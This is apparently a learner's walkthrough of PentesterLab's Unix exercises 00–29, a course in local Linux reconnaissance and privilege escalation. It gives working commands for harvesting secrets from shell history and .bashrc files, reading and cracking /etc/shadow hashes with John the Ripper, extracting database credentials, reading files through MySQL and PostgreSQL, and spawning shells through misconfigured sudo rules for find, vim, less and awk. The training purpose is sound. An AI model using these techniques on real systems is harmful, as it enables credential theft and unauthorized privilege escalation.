
<h1> Unix </h1>

# Unix 00

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* Here, we are starting with something very simple. You just need to read the content of the `key.txt` file. To do this you can use the `cat` command.

* All together, you end up with the following command:

* `$ cat key.txt`

* After running this command you should get the key to mark this exercise as solved.

* You can access this exercise using the following URL: [http://ptl-389d617c-785d2ac0.libcurl.so/](http://ptl-389d617c-785d2ac0.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-389d617c-785d2ac0.libcurl.so/](https://ptl-389d617c-785d2ac0.libcurl.so/).

# Unix 01

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In this challenge, the key is in the home directory of another user. To get to that directory, you can use the `cd` command. You can go up one directory using `cd ..` command.

* Once, you're there. You can use `ls` to list the content of this directory. You should see your current home directory `pentesterlab` and the target's home directory: `victim`. You can then move to the victim directory using: `cd victim`

* Once there, you can use `ls` to check what files are available and `cat` to get the key.
* `ls -l`
* `drwxr-xr-x 2 root root 4096 Jan 25 09:05 victim`
* `d` represents its a dirctory
* `r`, `w`, `x` represents `read`, `write`, `execute` respectively
* first `rwx` represents the premissions of `owner`
* second `r-x` represents the permissions of `group`
* third `r-x` represents the permisssion of `everyone`
* first `root` represents the `owner`
* second `root` represents the `group`

* You can access this exercise using the following URL: [http://ptl-1f35e6bb-32a7a5f9.libcurl.so/](http://ptl-1f35e6bb-32a7a5f9.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-1f35e6bb-32a7a5f9.libcurl.so/](https://ptl-1f35e6bb-32a7a5f9.libcurl.so/).

# Unix 02

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* This challenge is very similar to the previous exercise. The main difference is the permissions set on the victim directory. This time, you won't be able to list the content of the `/home/victim` directory. But you can still use `cat` to get the content of the `key.txt` file.

* You can access this exercise using the following URL: [http://ptl-9f7dcb3a-9394fd0d.libcurl.so/](http://ptl-9f7dcb3a-9394fd0d.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-9f7dcb3a-9394fd0d.libcurl.so/](https://ptl-9f7dcb3a-9394fd0d.libcurl.so/).

# Unix 03

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* When using a `Unix system`, it's pretty handy to remember what commands you ran. To do that most shells (where you type the command) keep a file with a list of the previous commands. 

* Here the victim is using `bash`. The shell bash uses the file `.bash_history` in the `home directory of the user` running the commands. The fact that the filename starts with a dot `.` indicates that it's a `hidden file`.

* Obviously, the list of previous commands ran by the victim can potentially contain interesting information. Here we can get access to this file by: 

	* Going to the home directory of the victim.
	* Listing the content of this directory using `ls -a` (the option `-a` will show the hidden files).
	* Reading the content of the file using `cat` and trying to find something that looks like a key.

* You can access this exercise using the following URL: [http://ptl-51bec765-5decc5a9.libcurl.so/](http://ptl-51bec765-5decc5a9.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-51bec765-5decc5a9.libcurl.so/](https://ptl-51bec765-5decc5a9.libcurl.so/).
 
# Unix 04

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In the previous challenge, we checked the `.bash_history` of one user. On most systems, you will have a lot more users and you will need to work faster.

* To do this, we can use the `find` command. We can tell find to search for all the files named `.bash_history` in the `/home directory`: `find /home -name .bash_history`

* From there, you should be able to retrieve the key like in the previous exercise.

* You can access this exercise using the following URL: [http://ptl-95a5ff1a-6af60969.libcurl.so/](http://ptl-95a5ff1a-6af60969.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-95a5ff1a-6af60969.libcurl.so/](https://ptl-95a5ff1a-6af60969.libcurl.so/).

# Unix 05

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In this challenge, you will learn about the `.bashrc` file. This file is loaded when a user start a new shell. It's often used to configure the shell or to load some information. 

* For example, you can use it to define aliases for command or to save some variables.

* To find the `.bashrc` files we have access to, we can use the `find` command. We can tell find to search for all the files named `.bashrc` in the `/home directory`: `find /home -name .bashrc`

* From there, you should be able to retrieve the key like in the previous exercises by looking at all the files. 

* Unfortunately, this is not efficient. The key is used in a command to define an alias that will allow the user to just type `check` instead of the full (fake) command `check_ptlab_key ....` 

* Using the argument `-exec` of the find command you should be able to grep for the check keywords:

### -exec command ;

* Execute `command ;` true if 0 status is returned.  

* All following arguments to `find` are taken to be arguments to the `command` until an argument consisting of `;` is encountered. 

* The string `{}` is replaced by the `current file name` being processed everywhere it occurs in the arguments to the `command`, not just in arguments where it is alone, as in some versions of `find`. 

* Both of these constructions might need to be escaped (with a `\`) or quoted to protect them from expansion by the shell.

* `find /home -name .bashrc -exec grep -H [PATTERN] {} \;`

* `-H` to show the file name which is the argument of `grep`

* or you can use `find /home -name .bashrc -exec cat {} \; | grep [PATTERN]`

* Where `[PATTERN]` should be replaced by the pattern you're searching for.

* During a review, it's also important to look at the `.bash_profile` that gets loaded when users log in via a console.


* You can access this exercise using the following URL: [http://ptl-1b83c205-60053644.libcurl.so/](http://ptl-1b83c205-60053644.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-1b83c205-60053644.libcurl.so/](https://ptl-1b83c205-60053644.libcurl.so/).

# Unix 06

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In the previous challenge, we check the `.bashrc` and found an alias that contained the key. 

* In this challenge, the key is defined in an environment variable using the `export` command. This will allow the user to type `$PTLAB_KEY` instead of the key every time they need to use the key.

* `find ../ -name .bashrc -exec grep export {} \; | grep -v [PATTERN]`

* `-v` argument of `grep` indicates excluding specified `[PATTERN]`

* or you can use `find ../ -name .bashrc -exec grep export {} \; | grep KEY`


* You can access this exercise using the following URL: [http://ptl-13baabde-5c2e394f.libcurl.so/](http://ptl-13baabde-5c2e394f.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-13baabde-5c2e394f.libcurl.so/](https://ptl-13baabde-5c2e394f.libcurl.so/).

# Unix 07

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* `bash` is not the only shell users can pick. They can use `sh`, `zsh`, `ksh`. In this example, you will need to find the user that use `zsh` and review the content of its `.zsh_history` file.

* `find . -name .*sh_history -exec cat {} \;`

* You can access this exercise using the following URL: [http://ptl-70406843-539688fe.libcurl.so/](http://ptl-70406843-539688fe.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-70406843-539688fe.libcurl.so/](https://ptl-70406843-539688fe.libcurl.so/).

# Unix 08

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In the previous challenges, all users had their home directory in `/home` (which is very common). However, it's not always the case (especially for `service accounts`).

* In this challenge, the home directory of one of the users is not in `/home`. You can find the location of this home directory by inspecting `/etc/passwd`.

* Once you find the user with the home directory outside of `/home`. You should be able to find the key by using one of the methods seen in the previous challenges.

* You can access this exercise using the following URL: [http://ptl-fb28a784-44fcc997.libcurl.so/](http://ptl-fb28a784-44fcc997.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-fb28a784-44fcc997.libcurl.so/](https://ptl-fb28a784-44fcc997.libcurl.so/).

# Unix 09

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In the previous challenges, we checked the `.bash_history` of users. One quick way to find passwords is to search for the following mistake: `people typing their password in their shell instead of the password prompt ` by messing with actual command. By doing that, their password will be available in the history files.

* you can even search for `sudo` or `su` or other similar areas

* Here, to make things simple, the password is the key.

* What we want to find are all the line with a call to the command passwd:

`$ grep passwd .bash_history`

* However, this only give us the call to passwd. Thankfully, we can ask grep to provide extra above 1 line by using `-A 1` as follows :

* `grep -A 1 passwd .bash_history`

* Finally, we can wrap this in a find command:

* `find /home -name .bash_history -exec grep -A 1 passwd {} \;`

* Unfortunately, we get too many results as our grep also match lines containing `/etc/passwd`. We can ask grep to only match the line starting with passwd by using `^`:

* `find . -name .bash_history -exec grep -A 1 '^passwd' {} \;`

* From there, you should be able to retrieve the key like in the previous exercises.

* You can access this exercise using the following URL: [http://ptl-28a18509-fe6add6c.libcurl.so/](http://ptl-28a18509-fe6add6c.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-28a18509-fe6add6c.libcurl.so/](https://ptl-28a18509-fe6add6c.libcurl.so/).

# Unix 10

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In this challenge, the user `root` left a file named `backup.tgz` in `/tmp`. Administrators often leave files in `/tmp` as `/tmp gets cleanup after each reboot`. It's often used when you don't want to keep the files you're working on or as a place to share files (as anyone can write in that directory on most systems). Therefore, it's really important when auditing or gaining access to a system to see what files you can find in `/tmp`.

* If you look at the permissions, on the directory:

* `$ ls -ld /tmp`
* `drwxrwxrwt   1 root root   4096 Mar 12 12:54 tmp`
* You can see that:
	* `tmp` is a directory as the line starts with `d`
	* `tmp` is available in `read`, `write`, `execute` for `everyone`.
	* `tmp` has the `sticky bit` set: the `t` at the end of the permissions.

* The `sticky bit` only allows the user who created a file in this directory (or the owner of the directory, ie: `root`) to modify this file.

* `file backup.tgz`

* Based on the file extension (`tgz`), the file is a `tar archive` that has been compressed using `gzip`. If you decompress the archive, you should find a file that contains the key.

* `tar -zxvf backup.tgz`

* `-z` to decompress `gzip`
* `-x` to extract `tar archive`
* `-v` for vebose
* `-f` for force

* You can access this exercise using the following URL: [http://ptl-677bb08c-f2f5bc2d.libcurl.so/](http://ptl-677bb08c-f2f5bc2d.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-677bb08c-f2f5bc2d.libcurl.so/](https://ptl-677bb08c-f2f5bc2d.libcurl.so/).

# Unix 11

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In this challenge, the user `root` left a file named `backup.tbz` in `/var/tmp`. Administrators often leave files in `/var/tmp`. The directory `/var/tmp does not get cleanup after each reboot`.

* `file backup.tbz`

* Based on the file extension (`tbz`), the file is a `tar archive` that has been compressed using `bzip`. If you decompress the archive, you should find a file that contains the key.

* `tar -jxvf backup.tbz`

* `-j` for `bzip`

* You can access this exercise using the following URL: [http://ptl-bb05cba9-82231a1c.libcurl.so/](http://ptl-bb05cba9-82231a1c.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-bb05cba9-82231a1c.libcurl.so/](https://ptl-bb05cba9-82231a1c.libcurl.so/).

# Unix 12

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In this challenge, the user `root` left a file named `backup.bz2` one of the temporary folders..

* Based on the file extension (`bz2`), the file has been compressed using `bzip`. If you decompress the archive, you should find a new file named `backup`. Since there is no extension to guess what the content is, you can use the command `file` to try to sniff the content of the file.

* Based on the file type, you should be able to extract the content of the archive.

* You can also retrieved the key by using the strings command (to extract strings from a file) and grep to match the format of the key.

* `$ bunzip2 -d backup.bz2`
* `$ file backup`
* from `file` command on `backup` we can see that its a `cpio` file (`copy input, copy output`).

* `cpio` tool can be used to copy files to and from archive.

* `$ cpio -idv --no-absolute-filename < backup`

* `-i`, `--extract`
	* Run in `copy-in` mode.
* `-d`, `--make-directories`
	* Create leading directories where needed.
* `-v` for verbose
* `--no-absolute-filenames`
	* Create all files relative to the current directory in copy-in mode, even if they have an absolute file name in the archive.

* You can access this exercise using the following URL: [http://ptl-743278ef-6917ecd3.libcurl.so/](http://ptl-743278ef-6917ecd3.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-743278ef-6917ecd3.libcurl.so/](https://ptl-743278ef-6917ecd3.libcurl.so/).

# Unix 13

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In this challenge, the user `root` runs a script on a daily basis using `cron`. This script is used to backup the home directory of users.

* To run jobs on a regular basis (daily, weekly, every 5 minutes), system administrators use `cron`. Depending on the system, multiple tools can be used `crontab`, `anacron`, `...`. Here you can find the cron jobs run daily in `/etc/cron.daily/`.

* If you check the content of the file used for backup, you will see that a key is part of the script to encrypt the content (using `symmetric encryption`). Using this information, you should be able to decrypt and decompress the backup to get its' content.

* you can see cron job backup script content
* `$ cat /etc/cron.daily/backup`

* `#!/bin/bash`
* `tar -zcvf /tmp/backup.tgz /home/victim`
* `openssl enc -aes256 -k P3NT35T3RL48 -in /tmp/backup.tgz  -out /tmp/backup.tgz.enc`
* `rm /tmp/backup.tgz`

* You can decrypt with same key(`P3NT35T3RL48`) as here symmentric encryption is begin used.
* `$ openssl enc -d -aes256 -k P3NT35T3RL48 -in /tmp/backup.tgz.enc  -out /tmp/backup.tgz`
* `$ tar -zxvf /tmp/backup.tgz`

* N.B.: 
	* Here, `asymmetric encryption` should be used. 
	* Furthermore, the content of the `tar` should be directly pass (via `|`) to `openssl` for encryption to avoid the unencrypted archive being available on the fileystem.
	* You need to set the permission on cron job script to avoid other to see the key.

* You can access this exercise using the following URL: [http://ptl-97065215-c9e0e3e5.libcurl.so/](http://ptl-97065215-c9e0e3e5.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-97065215-c9e0e3e5.libcurl.so/](https://ptl-97065215-c9e0e3e5.libcurl.so/).

# Unix 14


## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In this challenge, the user `root` created a backup of the home directory of users. Find it and extract the content based on previous exercises.

* Once you have the content, you should be able to become the user victim by using the command `su`:

* `$ su victim`

* Finally, since you're the user victim. You should be able to access the key in this user's home directory.


* You can access this exercise using the following URL: [http://ptl-d22dde34-f3d0072e.libcurl.so/](http://ptl-d22dde34-f3d0072e.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-d22dde34-f3d0072e.libcurl.so/](https://ptl-d22dde34-f3d0072e.libcurl.so/).


# Unix 15

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In this challenge, the user `root` created a copy of the `/etc/shadow` file. This file is highly sensitive as it contains the users' password. Since the copy is not protected, you can read it's content.

* By reading the content, you should see the password of the victim user. Once you have the password, you will need to crack it.

* Here the algorithm used is `DES` (you can tell by the size and format of it). This is common on very old systems and it's very weak (especially since only the first 8 bytes of the password are kept).

* You can crack this password using `John-the-Ripper`. John should already be packaged for your system if you use a Linux or MacOS (make sure you pick the jumbo version if available).

* First, you will need to copy the line you're interested in to a file. Then you should be able to crack the password in few seconds using:

* `$ john [FILE] --format=descrypt`
* Where `[FILE]` is the filename you picked.

* `$ john [FILE]`
* Here `john` will identify the hash type by itself.

* Finally, since you have its password, you can become the user victim. With this access, you should be able to access the key in this user's home directory.

* You can access this exercise using the following URL: [http://ptl-ce7aa472-e8699f95.libcurl.so/](http://ptl-ce7aa472-e8699f95.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-ce7aa472-e8699f95.libcurl.so/](https://ptl-ce7aa472-e8699f95.libcurl.so/).

# Unix 16

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In this challenge, the user `root` created a copy of the `/etc/shadow` file.

* This time, the only difference is the algorithm used to hash the password: `MD5` is used. It can be detected by the prefix of the password: `$1$`.

* If you look at other files, you can tell that:

* if the hash starts by `$2$` or `$2a$`, `Blowfish` is used;
* if the hash starts by `$5$`, `SHA-256` is used;
* if the hash starts by `$6$`, `SHA-512` is used.

* For `MD5`, You can use the format: `md5crypt` to crack this password.

* You can access this exercise using the following URL: [http://ptl-82da7469-15e093a1.libcurl.so/](http://ptl-82da7469-15e093a1.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-82da7469-15e093a1.libcurl.so/](https://ptl-82da7469-15e093a1.libcurl.so/).

# Unix 17

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In this challenge, the server is used to run `Tomcat`.

* Your goal is to retrieve the password of the Tomcat's administrator `admin`. In most cases, the file containing this information can be in two places:

	* the directory where tomcat is installed
	* a directory starting with `tomcat` in `/etc/`

* The file is named `tomcat-users.xml`. You should be able to use `find` to locate it. Once you find this file, use the `admin` password as a key for this exercise.

* The `tomcat-users.xml` file permissions should be handled properly.

* You can access this exercise using the following URL: [http://ptl-dbf06851-a6a4bda7.libcurl.so/](http://ptl-dbf06851-a6a4bda7.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-dbf06851-a6a4bda7.libcurl.so/](https://ptl-dbf06851-a6a4bda7.libcurl.so/).

# Unix 18

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* List process with following command
* `$ ps -edf`

* `-e` => Select all processes. Identical to `-A`.

* `-d` => Select all processes except session leaders.

* `-a` => Select all processes except both session leaders and processes not associated with a terminal.

* `ps aux` is different from `ps -aux` refer the man page of `ps`.

* `-f` => Do full-format listing. This option can be combined with many other UNIX-style options to add additional columns. It also causes the command arguments to be printed.  When used with `-L`, the `NLWP` (number of threads) and `LWP` (thread ID) columns will be added. 

* In Linux, every process has several IDs associated with it, including:

	* __Process ID (PID)__

		* This is an arbitrary number identifying the process. Every process has a `unique ID`, but after the process exits and the parent process has retrieved the exit status, the process ID is freed to be reused by a new process.

	* __Parent Process ID (PPID)__

		* This is just the `PID` of the process that started the process in question.

	* __Process Group ID (PGID)__

		* This is just the `PID` of the process group leader. If `PID == PGID`, then this process is a process group leader.

	* __Session ID (SID)__

		* This is just the `PID` of the session leader. If `PID == SID`, then this process is a session leader.

	* Sessions and process groups are just ways to treat a number of related processes as a unit. All the members of a process group always belong to the same session, but a session may have multiple process groups.

	* Normally, a `shell` will be a `session leader`, and every pipeline executed by that shell will be a process group. This is to make it easy to kill the children of a shell when it exits.

* Another common service running on Linux system is `mysql`. 

* On a lot of systems, you should be able to connect to it as `root` (the mysql root user) with no password:

* `$ mysql -u root`

* Once you get access to the database, you should be able to navigate it using the following queries:

* `show databases;`
* `use [DATABASE];`
* `show tables;`
* `select * from [TABLE];`

* `Where [DATABASE] and [TABLE] should be replaced by the value from the previous queries.`

* `N.B.`: the `show` and `use` command will not work in `SQL injections`, they are internal command that are not part of `SQL`

* The key is the password of the `admin` user in one of the local databases.

* You can access this exercise using the following URL: [http://ptl-fd03129b-c8d189a5.libcurl.so/](http://ptl-fd03129b-c8d189a5.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-fd03129b-c8d189a5.libcurl.so/](https://ptl-fd03129b-c8d189a5.libcurl.so/).


# Unix 19

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In this challenge, the only thing that is different is that the password of the Mysql `root` user is set to an anagram of `root`. You can use the `-p` argument to set the password.

* `Anagram` is a word formed by rearranging the letters of another, such as `toor`,`orot`,`...`, formed from `root`	.

* The key is the password of the `admin` user in one of the local databases.

* You can access this exercise using the following URL: [http://ptl-d39c7157-15f24461.libcurl.so/](http://ptl-d39c7157-15f24461.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-d39c7157-15f24461.libcurl.so/](https://ptl-d39c7157-15f24461.libcurl.so/).

# Unix 20

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In this challenge, two issues exist with the `mysql` system account:

	* Trivial password.
	
	* The account has a valid shell instead of `/bin/false`.
	
* This should allow you to log in as the system user `mysql`.

* `$ su mysql` with password as `mysql`

* Once you're logged in, you can get access to the Mysql `root` password by running strings on the following file: `/var/lib/mysql/mysql/user.MYD`.

* You should get 2 passwords:

	* debian-sys-maint
	* root

* The root password is likely split into two parts:

`$ strings /var/lib/mysql/mysql/user.MYD`
```
    localhost
root*8246FACFAA5BB9CFDCDEAEDA
6c732c6044b7
root
    127.0.0.1
root
root
    localhost
debian-sys-maint*7B6D59ECDB7B791CF100CA46D0AD911082112351
15DA4067EAA55FBC
```

* The first part is `*8246FACFAA5BB9CFDCDEAEDA` and the second part is `15DA4067EAA55FBC` (the value sould be different on the live instance).
	
* Once you put them together, you should get a file containing:

* `root:*8246FACFAA5BB9CFDCDEAEDA15DA4067EAA55FBC`

* You should then be able to crack the password using `john` (you will need the jumbo patch version of John) after you find the right format (by trial and error).

* Once you cracked the password you should be able to log in to retrieve the key like in the previous exercises.

* The key is the password of the `admin` user in one of the local databases.

# Unix 21

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In this challenge, `mysql` doesn't have a `root` password. Once you gain access, your goal is to read the content of the file `/var/lib/mysql-files/key.txt` using the `load_file(...)` MySQL function.

* `mysql> select load_file('/var/lib/mysql-files/key.txt');`

* You can access this exercise using the following URL: [http://ptl-32c02666-03f7997c.libcurl.so/](http://ptl-32c02666-03f7997c.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-32c02666-03f7997c.libcurl.so/](https://ptl-32c02666-03f7997c.libcurl.so/).

# Unix 22

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In this challenge, the user `postgres` has a trivial password. Once you get access to this account you should be able to connect to the local `PostgreSQL` database by running `psql`

* Often people setup `postgresql` with system user.

* `$ su postgres` with password as `postgres`
* `$ psql`

* Once you gain access, you can navigate the database using:

	* `\list` to list the databases
	* `\c [DATABASE]` to select the database `[DATABASE]`
	* `\d` to list the tables

* Then you should get the key by using `SELECT` to find the password of the `admin` account.

* You can access this exercise using the following URL: [http://ptl-02470ed6-51f7507d.libcurl.so/](http://ptl-02470ed6-51f7507d.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-02470ed6-51f7507d.libcurl.so/](https://ptl-02470ed6-51f7507d.libcurl.so/).

# Unix 23

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In this challenge, a web application is installed in `/var/www`. You should be able to get credentials to connect to the database by reading some of the source code.

* Once you gain access, you can read files from the file system using:

	* `# CREATE TABLE demo(t text);`
	* `# COPY demo from '[FILENAME]';`
	* `# SELECT * FROM demo;`

	* Where `[FILENAME]` is the filename.

* You can use above commands to any file from system to `psql`.

* Here, your goal is to get the key from `/var/lib/postgresql/9.4/key.txt`.

* Once done, you can remove the table using:

	* `# DROP TABLE demo;`

* This exercise highlights three issues:

	* the permissions on `/var/www` are too weak.

	* the `Postgresql photoblog user` has too much privileges.

	* the `Postgresql photoblog user` has a trivial password (not that a strong password will have limit the exploitation)

* here you can connect to `photoblog` database with user `photoblog`.
* `$ psql photoblog -U photoblog -W` with password `photblog` entred to prompt.


* You can access this exercise using the following URL: [http://ptl-c7f80644-32b0a737.libcurl.so/](http://ptl-c7f80644-32b0a737.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-c7f80644-32b0a737.libcurl.so/](https://ptl-c7f80644-32b0a737.libcurl.so/).
 
# Unix 24

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In this challenge, a `SQLite3` database has been copied in `/tmp`. You can make sure it's a `SQLite 3 database` by using the `file` command:

	* `$ file [FILENAME]`
	* `database.db: SQLite 3.x database`

* You can then access it using:

	* `$ sqlite3 [FILENAME]`

* Once you gain access to it, you can navigate the content using:

	* `.tables` to get a list of tables.

	* `SELECT ....` to extract the content of a table using SQL.

* With this information, you should be able to get the password of the `admin` that is the key to solve this exercise.

* You can access this exercise using the following URL: [http://ptl-3a9c496a-3577b368.libcurl.so/](http://ptl-3a9c496a-3577b368.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-3a9c496a-3577b368.libcurl.so/](https://ptl-3a9c496a-3577b368.libcurl.so/).

# Unix 25

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In this challenge, we are going to look into the `sudo` command. The `sudo` command is used to run commands as another user. Most of the time, it's used to give `unpriviliged users` the right to run command as `root`.

* The first thing to do is to check what you can do by running the following command:

	* `$ sudo -l`

* `sudo` will most likely ask you for the password of the `current user`.

* Once you executed `sudo -l`, you should see something similar to the following:

	* `$ sudo -l`
	* `We trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things:`
    	* `#1) Respect the privacy of others.`
    	* `#2) Think before you type.`
    	* `#3) With great power comes great responsibility.`
	* `[sudo] password for pentesterlab: `
	* `Matching Defaults entries for pentesterlab on 4d451a0aa68f: `
		* `env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin`

	* `User pentesterlab may run the following commands on 4d451a0aa68f: `
		* `(victim) /bin/bash`

* The key information is located in the final lines: you're allowed to run the command `/bin/bash` as `victim`.

* Since you can run `/bin/bash`, you can run any command after that. First, you can run:

 	* `sudo -u victim /bin/bash`

* After running this command, you're actually running all the following commands as the user victim:

	* `$ id`
	* `uid=1001(victim) gid=1001(victim) groups=1001(victim)`

* You should now be able to get access to the `key.txt` file in the home directory of the `victim` user. 

* Sometime administrators make mistakes while configuring `sudo` , Hence its good idea to take a look at `sudo` configuration files.

* You can access this exercise using the following URL: [http://ptl-f138180b-4b3acb07.libcurl.so/](http://ptl-f138180b-4b3acb07.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-f138180b-4b3acb07.libcurl.so/](https://ptl-f138180b-4b3acb07.libcurl.so/).

# Unix 26

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In this challenge, we are going to work on more privileges escalation based on misconfigurations of the `sudo` command. As before, you can use `sudo -l` to see what command you're authorized to run.

* You can see that you're allowed to run the command `/usr/bin/find`, based on previous exercise on `find` and the argument `-exec`, you should be able to escalate your privileges and start a shell (`/bin/bash`) as the `victim` user. Once you do, you should see the key in the home directory of the `victim` user.

* `$ sudo -u victim find /etc/ -name passwd -exec bash \;` to generate one bash shell as only one `passwd` file exists in `/etc/` folder.

* Otherwise, you can also use `-exec` to run the command `cat` on the `key.txt` file directly.

* `$ sudo -u victim find /home/victim -name key.txt -exec cat {} \;`

* You can access this exercise using the following URL: [http://ptl-d4e42785-318caa1d.libcurl.so/](http://ptl-d4e42785-318caa1d.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-d4e42785-318caa1d.libcurl.so/](https://ptl-d4e42785-318caa1d.libcurl.so/).

# Unix 27

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In this challenge, we are going to work on more privileges escalation based on misconfigurations of the `sudo` command. As before, you can use `sudo -l` to see what command you're authorized to run.

* Here there are two ways to solve the challenge:
	* just using the command to read the file containing the key.
	* use the command to get a shell as the victim

* Reading the file can be done directly by specifying the file's path on the command line after the command or by opening the file inside `vim` (using `:r [PATH]`).

* To gain a shell as the user `victim`, you can start `vim` then you can type the following: `:!/bin/bash` to run `/bin/bash`. Since `vim` run as the `victim` user (thanks to `sudo`), the new shell will also run as the user `victim`. Once you do get the `shell`, you should see the key in the home directory of the `victim` user.

* You can access this exercise using the following URL: [http://ptl-40fe3775-f41c77ff.libcurl.so/](http://ptl-40fe3775-f41c77ff.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-40fe3775-f41c77ff.libcurl.so/](https://ptl-40fe3775-f41c77ff.libcurl.so/).

# Unix 28

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In this challenge, we are going to work on more privileges escalation based on misconfigurations of the `sudo` command. As before, you can use `sudo -l` to see what command you're authorized to run.

* Here there are two ways to solve the challenge:

	* just using the command to read the file containing the key.

	* use the command to get a shell as the victim

* Reading the file can be done directly by specifying the full path of the file on the command line after the command or by opening the file inside `less` (using `:e [PATH]`).

* To gain a shell as the user `victim`, you can start `less` then you can type the following: `!/bin/bash` to run `/bin/bash`. Since `less` run as the `victim` user (thanks to `sudo`), the new shell will also run as the user `victim`. Once you do get the shell, you should see the key in the home directory of the victim user.

* You can access this exercise using the following URL: [http://ptl-733b7a44-cfddebf3.libcurl.so/](http://ptl-733b7a44-cfddebf3.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-733b7a44-cfddebf3.libcurl.so/](https://ptl-733b7a44-cfddebf3.libcurl.so/).

# Unix 29

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In this challenge, we are going to work on more privileges escalation based on misconfigurations of the `sudo` command. As before, you can use `sudo -l` to see what command you're authorized to run.

* Here there are two ways to solve the challenge:

	* just using the command to read the file containing the key.
	* use the command to get a shell as the victim

* Reading the file can be done directly by specifying the file's path on the command line after the command: `awk '{print $1}' /home/victim/key.txt`

* To gain a shell as the user victim, you can use the following command: `awk 'BEGIN {system("/bin/bash")}'`

* `BEGIN` pattern: means that `Awk` will execute the action(s) specified in `BEGIN` once before any input lines are read. In out usage it will prevent swapning multiple shell for multiple file that is processing.

* `END` pattern: means that `Awk` will execute the action(s) specified in `END` before it actually exits.

 ```
awk '
 	BEGIN { actions } 
 	/pattern/ { actions }
 	/pattern/ { actions }
            ……….
	 END { actions } 
' filenames  
```

